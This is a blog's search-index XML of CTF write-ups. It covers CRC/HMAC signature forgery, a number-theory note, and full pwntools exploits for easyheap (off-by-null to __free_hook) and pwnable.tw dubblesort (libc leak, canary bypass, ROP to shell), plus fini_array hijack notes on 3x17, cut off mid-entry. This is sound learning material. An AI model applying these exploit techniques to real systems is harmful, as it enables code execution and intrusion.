<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Techniques and Attacks of CRC in CTF</title>
      <link href="/2020/11/08/CRC/"/>
      <url>/2020/11/08/CRC/</url>
      
        <content type="html"><![CDATA[<h3 id="Basis"><a href="#Basis" class="headerlink" title="Basis"></a>Basis</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CRC(a^b^c) &#x3D; CRC(a) ^ CRC(b)</span><br><span class="line">in polynomial form, we have</span><br><span class="line">CRC(a||b) &#x3D; a*x^(64+Lenb) + b*x^64 + CONST mod CRC_POLY -- Lenb is the bit len of msg b</span><br></pre></td></tr></table></figure><h3 id="Expand"><a href="#Expand" class="headerlink" title="Expand"></a>Expand</h3><p>Off-topic, if you want to know <strong>how to print math symbols in markdown</strong>, please click <a href="https://blog.csdn.net/katherine_hsr/article/details/79179622" target="_blank" rel="noopener">this</a>, doge.</p><p>In <a href="https://en.wikipedia.org/wiki/HMAC" target="_blank" rel="noopener">HAMC</a>-CRC, there is $CRC(K \bigoplus opad || CRC(K \bigoplus ipad || M))$, which can be transfered into $CRC(K \bigoplus opad || CRC(K \bigoplus ipad || (M1 \bigoplus M2)))$ where $M1 \bigoplus M2 = M$.</p><p>Furher, we could get the equation that </p><p>$CRC(K \bigoplus opad || CRC(K \bigoplus ipad || (M1 \bigoplus M2)))$ $=$ </p><p>​    $CRC(K \bigoplus opad || CRC(K \bigoplus ipad || M1))$ $\bigoplus$ </p><p>​    $CRC(K \bigoplus opad || CRC(K \bigoplus ipad ||M2))$</p><p>, which give me a chance to forge.</p><p>As for polynomial form, we could rewrite it as</p><p>$HMAC(K, m) = m<em>x^{128} + K</em>x^{(128+M)} + ipad<em>x^{(128+M)} + CONST</em>x^{64} + K<em>x^{128} + opad</em>x^{128} + CONST \ mod \ CRC_POLY $</p><p>So,  $HMAC(K, m) + HMAC(0, m) = K<em>x^{(128+M)} + K</em>x^{128} \ mod \ CRC_POLY$</p><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><h4 id="Example-1-2015-MMA-CTF-motto-mijikai-address"><a href="#Example-1-2015-MMA-CTF-motto-mijikai-address" class="headerlink" title="Example 1: 2015 MMA CTF - motto mijikai address"></a>Example 1: 2015 MMA CTF - motto mijikai address</h4><blockquote><p>In this challenge, we can register users, login and create shortened urls. Our first goal is to login as admin. Session data is stored in cookies, signed with some HMAC.  </p></blockquote><p>The key idea is that obtain the two signature S1 and S2 for name N1 and N2, where N1^N2 = ‘admin’. So, the signature for ‘admin’ will be S1^S2.</p><h4 id="Example-2-2016-BKP-CTF-HMAC-CRC"><a href="#Example-2-2016-BKP-CTF-HMAC-CRC" class="headerlink" title="Example 2: 2016 BKP CTF - HMAC CRC"></a>Example 2: 2016 BKP CTF - HMAC CRC</h4><blockquote><p>In the <a href="https://ctftime.org/task/2108" target="_blank" rel="noopener">challenge</a>, We’re trying a new mac here at BKP—HMAC-CRC. The hmac (with our key) of “zupe zecret” is ‘0xa57d43a032feb286’. What’s the hmac of “BKPCTF”? </p></blockquote><p>As we mentioned in the <strong>Expand</strong>, we can regard it as polynomial, so we know </p><p>$HMAC(K, m) + HMAC(0, m) = K<em>x^{(128+M)} + K</em>x^{128} \ mod \ CRC_POLY$         (1)</p><p>, denote it as $KX$</p><p>$HMAC(1, m) + HMAC(0, m) = x^{(128+M)} + x^{128} \ mod \ CRC_POLY$                     (2)</p><p>, that is, $X$</p><p>It’s clearly that we can calculate the <strong>K</strong> by $KX * inverse_mod(X, CRC_POLY) \ mod \ CRC_POLY$.</p><p>The script can be found in <a href="https://gist.github.com/zrax-x/1785d3a2f5cb2af85fb4354fd4522a17" target="_blank" rel="noopener">this</a>. Here, thanks to @<a href="http://mslc.ctf.su/wp/boston-key-party-ctf-2016-hmac-crc-crypto-5pts/" target="_blank" rel="noopener">hellman’s blog</a>, which gives me the idea and the template of the script.</p><h4 id="Example-3-2020-ALLES-CTF-crccalc2"><a href="#Example-3-2020-ALLES-CTF-crccalc2" class="headerlink" title="Example 3: 2020 ALLES!CTF - crccalc2"></a>Example 3: 2020 ALLES!CTF - crccalc2</h4><p>WP Link: <a href="https://ctftime.org/writeup/23323" target="_blank" rel="noopener">https://ctftime.org/writeup/23323</a></p><p><strong>pending…</strong></p><h4 id="Example-4-2020-Hackergame-中间人"><a href="#Example-4-2020-Hackergame-中间人" class="headerlink" title="Example 4: 2020 Hackergame - 中间人"></a>Example 4: 2020 Hackergame - 中间人</h4><p>WP Link: <a href="https://github.com/USTC-Hackergame/hackergame2020-writeups/tree/master/official/%E4%B8%AD%E9%97%B4%E4%BA%BA" target="_blank" rel="noopener">https://github.com/USTC-Hackergame/hackergame2020-writeups/tree/master/official/%E4%B8%AD%E9%97%B4%E4%BA%BA</a></p><p><strong>pending…</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> CRC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hensel’s Lemma &amp; LTE (Lifting The Exponent)</title>
      <link href="/2020/11/06/Hensel_s_Lemma_LTE/"/>
      <url>/2020/11/06/Hensel_s_Lemma_LTE/</url>
      
        <content type="html"><![CDATA[<h2 id="Hensel’s-Lemma"><a href="#Hensel’s-Lemma" class="headerlink" title="Hensel’s Lemma"></a>Hensel’s Lemma</h2><p><a href="https://www.geeksforgeeks.org/hensels-lemma" target="_blank" rel="noopener">https://www.geeksforgeeks.org/hensels-lemma</a></p><blockquote><p><strong>Hensel’s Lemma</strong> is a result that stipulates conditions for roots of polynomials modulo powers of primes to be “lifted” to roots modulo higher powers. The lifting method outlined in the proof is reminiscent of <strong>Newton’s Method</strong> for solving equations. Say the equations of the below type is to be solved: </p></blockquote><p>​                                    $x^3 - a = 0 \ mod \ p^k$</p><blockquote><p>The idea is to use <strong>Hensel’s Lemma</strong> to solve this type of congruence. It is also known as Hensel’s “lifting” lemma, which is a result of <a href="https://www.geeksforgeeks.org/modular-arithmetic/" target="_blank" rel="noopener">modular arithmetic</a>. If <strong>f</strong> is a polynomial function and <strong>p</strong> is a <a href="https://www.geeksforgeeks.org/prime-numbers/" target="_blank" rel="noopener">Prime Number</a>, then if <strong>f(a1) = 0 (mod p)</strong> and <strong>[f’(a1)] mod p != 0</strong>, then it’s possible to “lift” this solution to the solution for <strong>f(x) = 0 (mod pk)</strong> by using the below <a href="http://www.geeksforgeeks.org/recursion/" target="_blank" rel="noopener">recursion</a>. Note that the <strong>[f’(a1)]-1</strong> refers to the <a href="https://www.geeksforgeeks.org/multiplicative-inverse-under-modulo-m/" target="_blank" rel="noopener">modular inverse</a> of <strong>f ‘(a1) modulo p</strong>. </p></blockquote><p>​                        $a_{k+1} = a_k - f(a_k) * [f’(a_1)]^{-1} \ mod \ p^{k+1}$</p><h2 id="LTE-Lifting-The-Exponent"><a href="#LTE-Lifting-The-Exponent" class="headerlink" title="LTE (Lifting The Exponent)"></a>LTE (Lifting The Exponent)</h2><p><a href="https://brilliant.org/wiki/lifting-the-exponent" target="_blank" rel="noopener">https://brilliant.org/wiki/lifting-the-exponent</a></p><p><a href="https://www.cnblogs.com/Eufisky/p/9333142.html" target="_blank" rel="noopener">https://www.cnblogs.com/Eufisky/p/9333142.html</a></p><p>Let $p$ be a prime and $n$ a nonzero integer. Then we define $v_p(n)$ to be the exponent of $p$ in the prime factorization of $n$. That is, </p><p>$v_p(n)=k⟺p^k∣n \ and \ p^{k+1}∤n. $</p><p>Let $p$ be a prime, $x$ and $y$ integers, $n$ a positive integer, and suppose that $p|(x-y)$ but $p\nmid x$ and $p\nmid y$. Then </p><ul><li>if $p$ is odd,  $v_p(x^n−y^n)=v_p(x−y)+v_p(n); $</li><li>for $p = 2$ and even $n$, $v_2(x^n-y^n) = v_2(x-y) + v_2(n) + v_2(x+y) - 1$. </li></ul><p>Notice that if $n$ is odd, we can substitute $-y$ for $y$ in (1) to obtain </p><p>$v_p(x^n+y^n)=v_p(x+y)+v_p(n) $ </p><p>if $p|(x+y)$ </p>]]></content>
      
      
      
        <tags>
            
            <tag> 数论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bytedance 2020 easyheap</title>
      <link href="/2020/10/26/bytedance_2020_easyheap/"/>
      <url>/2020/10/26/bytedance_2020_easyheap/</url>
      
        <content type="html"><![CDATA[<p>第一次在正式比赛中做PWN题，虽然因为不熟悉一些利用技巧导致走了很多弯路，但在队友的帮助下做出来就很舒服。</p><p>经典菜单题，这也是我为什么会选择做这题的原因orz，没有edit。</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>查看add函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">"%hd"</span>, &amp;v1);</span><br><span class="line">v2 = v1;</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; <span class="number">128</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid size."</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>, &amp;v1);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%hd"</span>, &amp;v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v1 &lt;= <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 &gt; <span class="number">128</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v2 = v1;</span><br><span class="line">&#125;</span><br><span class="line">s = <span class="built_in">malloc</span>(v1);</span><br><span class="line"><span class="keyword">if</span> ( !s )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Malloc error."</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, v1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Content: "</span>, <span class="number">0L</span>L);</span><br><span class="line">sub_12CC((__int64)s, v1);</span><br><span class="line">*((_BYTE *)s + v2 - <span class="number">1</span>) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>注意这里第三行在输入v1后会立即对v2赋值，但是假如v1不在[1,128]之间就会提示重新输入v1，但是显然程序后续没有更新v2的值，这导致在最后一行对s赋值的时候，v2!=v1，造成off-by-null。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>我们尝试申请到一个块的低位地址为00，同时将其free到unsorted bin里面（题目中有8个块，因此可以做到）然后利用off-by-null我们可以伪造另一个块的fd指向unsorted bin中块，然后连续申请块，利用show功能获取libc地址信息。至此我们完成了对libc的泄露。但这里我们观察到程序中有个memset(s, 0, v1);因此我们在申请块的时候可以输入使v1=1，这样只会清空unsorted bin中的块的最低位的一个字节，而这个字节是固定的，可以通过调试获取到。</p><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>获取到libc基址后我们就可以获取到system函数地址以及__free_hook地址。然后再次尝试申请到一个块的低位为00，通过off-by-null伪造这个块的fd指向本身，这样我们首先申请到这个块，然后将其fd改为__free_hook后，再次申请，这次我们把内容改写为system的地址。然后随便free一个块就能拿到shell。</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_with_overflow</span><span class="params">(size, fake_size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(fake_size))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'aaaaaaaaaaa'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> [<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]:</span><br><span class="line">        free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">add_with_overflow(<span class="number">0x80</span>, <span class="number">0x1b1</span>, <span class="string">"bbbbbbbbbb"</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'cccccc'</span>)</span><br><span class="line">add_with_overflow(<span class="number">0x1</span>, <span class="number">0x111</span>, <span class="string">'\xe0'</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x1ebce0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>, hex(libc_base)</span><br><span class="line">free_hook = libc_base + <span class="number">0x1eeb28</span></span><br><span class="line">system_addr = libc.sym[<span class="string">'system'</span>] + libc_base</span><br><span class="line"><span class="keyword">print</span> <span class="string">"free_hook:"</span>, hex(free_hook)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr:"</span>, hex(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'xxxxxxxxxxxx'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add_with_overflow(<span class="number">0x60</span>, <span class="number">0x1e1</span>, <span class="string">'aaaaa'</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x60</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x60</span>, p64(system_addr))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Off-by-null </tag>
            
            <tag> Tcache bin </tag>
            
            <tag> Unsorted bin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw dubblesort</title>
      <link href="/2020/10/23/pwnable_dubblesort/"/>
      <url>/2020/10/23/pwnable_dubblesort/</url>
      
        <content type="html"><![CDATA[<p> 查看逻辑，发现主要为冒泡排序。漏洞点为两个，第一个比较明显，就是在输入数字的时候存在栈溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf((<span class="keyword">int</span>)<span class="string">"%u"</span>, (<span class="keyword">int</span>)&amp;v12);</span><br><span class="line">v3 = v12;</span><br><span class="line"><span class="keyword">if</span> ( v12 )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = &amp;v13;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Enter the %d number : "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf((<span class="keyword">int</span>)<span class="string">"%u"</span>, (<span class="keyword">int</span>)v4);</span><br><span class="line">    ++v5;</span><br><span class="line">    v3 = v12;</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v12 &gt; v5 );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二点比较隐蔽，在输入name后，程序会打印name，但是这里就存在泄露。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"What your name :"</span>);</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">__printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Hello %s,How many numbers do you what to sort :"</span>);</span><br></pre></td></tr></table></figure><p>因为read时不会给buf带上\x00，因此就会泄露栈上的后续地址的内容。通过调试，可以看到在输入的字符串后的第25个字节开始就是和libc地址有关的信息</p><p><img src="/2020/10/23/pwnable_dubblesort/1603693654936.png" alt="1603693654936"></p><p>同时通过查看vmmap可以计算出两者的地址偏移值为0x1b0000</p><p><img src="/2020/10/23/pwnable_dubblesort/1603693801036.png" alt="1603693801036"></p><p>有了libc基址后我们就可以愉快的计算出system和/bin/sh的地址，完成rop。</p><p>但是查看程序开启的保护，发现有canary，这导致栈溢出无法进行，因为我们不知道栈上的magic num值。于是这里需要一个技巧（网上查到的）</p><h3 id="scanf中的一个机制"><a href="#scanf中的一个机制" class="headerlink" title="scanf中的一个机制"></a>scanf中的一个机制</h3><p>当我们输入+或者-号时程序会读取成功，但同时不会对变量值进行赋值，这样就能保证在对magic_num进行赋值时我们可以保持原来的值不变就能成功绕过canary保护。</p><p>最后在进行rop的时候由于有canary，可能并不是很清楚我们需要溢出多少个字节，这时候我们可以借助gdb调试功能进行计算或者直接利用反汇编代码查看main函数的esp指针变化情况。</p><p>最终完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">"name :"</span>, <span class="string">"A"</span>*(<span class="number">4</span>*<span class="number">6</span>))</span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">addr = u32(p.recv(<span class="number">3</span>).rjust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line"></span><br><span class="line">libc_base = addr - <span class="number">0x1b0000</span></span><br><span class="line">addr_system = libc_base + <span class="number">0x3a940</span></span><br><span class="line">addr_shell = libc_base + <span class="number">0x158e8b</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"sort :"</span>, str(<span class="number">6</span>*<span class="number">4</span>+<span class="number">1</span>+<span class="number">7</span>+<span class="number">3</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>*<span class="number">4</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"number : "</span>, <span class="string">"0"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"number : "</span>, <span class="string">"+"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"number : "</span>, str(addr_system<span class="number">-1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"number : "</span>, str(addr_system))</span><br><span class="line">p.sendlineafter(<span class="string">"number : "</span>, str(addr_system))</span><br><span class="line">p.sendlineafter(<span class="string">"number : "</span>, str(addr_shell))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw 3x17</title>
      <link href="/2020/10/22/pwnable_3x17/"/>
      <url>/2020/10/22/pwnable_3x17/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点1"><a href="#知识点1" class="headerlink" title="知识点1"></a>知识点1</h3><p>熟悉start函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401A50                 public start</span><br><span class="line">.text:0000000000401A50 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000401A50 ; __unwind &#123;</span><br><span class="line">.text:0000000000401A50                 xor     ebp, ebp</span><br><span class="line">.text:0000000000401A52                 mov     r9, rdx</span><br><span class="line">.text:0000000000401A55                 pop     rsi</span><br><span class="line">.text:0000000000401A56                 mov     rdx, rsp</span><br><span class="line">.text:0000000000401A59                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:0000000000401A5D                 push    rax</span><br><span class="line">.text:0000000000401A5E                 push    rsp</span><br><span class="line">.text:0000000000401A5F                 mov     r8, offset sub_402960</span><br><span class="line">.text:0000000000401A66                 mov     rcx, offset loc_4028D0</span><br><span class="line">.text:0000000000401A6D                 mov     rdi, offset sub_401B6D</span><br><span class="line">.text:0000000000401A74                 db      67h</span><br><span class="line">.text:0000000000401A74                 call    sub_401EB0</span><br><span class="line">.text:0000000000401A7A                 hlt</span><br><span class="line">.text:0000000000401A7A ; &#125; &#x2F;&#x2F; starts at 401A50</span><br><span class="line">.text:0000000000401A7A start           endp</span><br></pre></td></tr></table></figure><p>对应于有符号的start函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400890 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000400890 ; __unwind &#123;</span><br><span class="line">.text:0000000000400890                 xor     ebp, ebp</span><br><span class="line">.text:0000000000400892                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:0000000000400895                 pop     rsi             ; argc</span><br><span class="line">.text:0000000000400896                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:0000000000400899                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:000000000040089D                 push    rax</span><br><span class="line">.text:000000000040089E                 push    rsp             ; stack_end</span><br><span class="line">.text:000000000040089F                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:00000000004008A6                 mov     rcx, offset __libc_csu_init ; init</span><br><span class="line">.text:00000000004008AD                 mov     rdi, offset main ; main</span><br><span class="line">.text:00000000004008B4                 call    __libc_start_main</span><br><span class="line">.text:00000000004008B4 _start          endp</span><br></pre></td></tr></table></figure><p>不难发现，r8寄存器中存放的是__libc_csu_fini函数地址，rcx中存访的是__libc_csu_init，rdi中存放main。其函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_start_main(<span class="keyword">int</span> (main) (<span class="keyword">int</span>, <span class="keyword">char</span> , <span class="keyword">char</span> ), <span class="keyword">int</span> argc, <span class="keyword">char</span> * ubp_av, <span class="keyword">void</span> (init) (<span class="keyword">void</span>), <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>), <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>), <span class="keyword">void</span> ( stack_end));</span><br></pre></td></tr></table></figure><h3 id="知识点二"><a href="#知识点二" class="headerlink" title="知识点二"></a>知识点二</h3><p>start函数流程</p><p>start -&gt; _libc_start_main -&gt; libc_csu_init(init_array) -&gt; main -&gt; libc_csu_finit(fini_array) -&gt; exit(main_ret) </p><p>这里要注意的是，<code>_init_array</code>执行顺序是下标由小到大，<code>_fini_array</code>执行顺序是下标由大到小。 </p><p>因此可以画为</p><ul><li>.init</li><li>.init_array[0]</li><li>.init_array[1]</li><li>…</li><li>.init_array[n]</li><li>main</li><li>.fini_array[n]</li><li>…</li><li>.fini_array[1]</li><li>.fini_array[0]</li><li>.fini</li></ul><h3 id="知识点三"><a href="#知识点三" class="headerlink" title="知识点三"></a>知识点三</h3><p>改fini_array使程序循环执行main函数</p><p>这里的操作是将fini_array[1]改为main函数首地址，fini_array[0]则改为libc_csu_finit函数首地址。这样程序在执行玩main后会执行libc_csu_finit，其中libc_csu_finit函数会首先执行main，然后又是执行libc_csu_finit函数。因此，会陷入死循环。</p><h3 id="知识点四"><a href="#知识点四" class="headerlink" 